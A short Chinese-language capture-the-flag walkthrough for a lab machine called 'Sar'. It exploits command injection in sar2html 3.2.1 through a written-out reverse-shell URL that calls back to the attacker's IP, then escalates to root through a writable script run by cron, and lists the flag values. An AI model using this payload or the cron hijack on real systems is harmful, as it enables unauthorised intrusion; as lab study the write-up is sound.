# Sar

打Web
![](images/Qt2OC3S.png)

掃了一下路徑 感覺能用的東西蠻少的
![](images/Ur3BneQ.png)

robots.txt裡面有一行奇怪的東西 把它丟到路徑下可以進到一個奇怪的CMS sar2html 3.2.1
![](images/7b5J0Wt.png)

![](images/DSljrD4.png)

隨便查一下可以查到一個exploit 裡面內容蠻少的 感覺像是Command Injection

![](images/z1qnjR4.png)

![](images/u9rxPEZ.png)

輸入以後可以看到多出來幾個東西 點開第一個可以發現輸入id有效 把id改成reverse shell就可以直接RCE了

```
http://192.168.162.35/sar2HTML/index.php?plot=;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.162%2F443%200%3E%261%27
```

![](images/YFHxfKV.png)

#### 提權

發現Cron會執行`/var/www/html/finally.sh`
![](images/RexwCGy.png)

到目錄下看 可以看到`finally.sh`會執行`write.sh` 而且我們有對`write.sh`寫入的權限
![](images/y5QXm75.png)

丟一個reverse shell進去 大概等一段時間就可以拿到root的shell了
![](images/M4xXEu4.png)

#### Proof

local.txt
`67330e8b480c61fe5613119db5c9a7d8`
![](images/bFkggTI.png)

proof.txt
`d86a65d198730217034a6d8202453ba4`
![](images/QS7fFB0.png)